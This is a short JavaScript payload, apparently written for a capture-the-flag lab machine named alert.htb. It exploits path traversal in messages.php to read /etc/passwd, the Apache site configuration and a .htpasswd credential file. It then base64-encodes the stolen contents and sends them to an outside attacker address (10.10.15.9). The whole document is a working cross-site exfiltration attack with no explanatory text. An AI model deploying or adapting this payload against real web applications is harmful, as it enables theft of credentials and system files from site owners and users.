var req = new XMLHttpRequest();
//req.open('GET', 'http://alert.htb/index.php?page=messages', false);
//req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../../etc/passwd', false);
//req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../../etc/apache2/sites-available/000-default.conf', false);
req.open('GET', 'http://alert.htb/messages.php?file=../../../../../../../../../../../var/www/statistics.alert.htb/.htpasswd', false);
req.send();

var exfil = new XMLHttpRequest();
exfil.open('GET', 'http://10.10.15.9/?b64=' + btoa(req.responseText), false)
exfil.send();
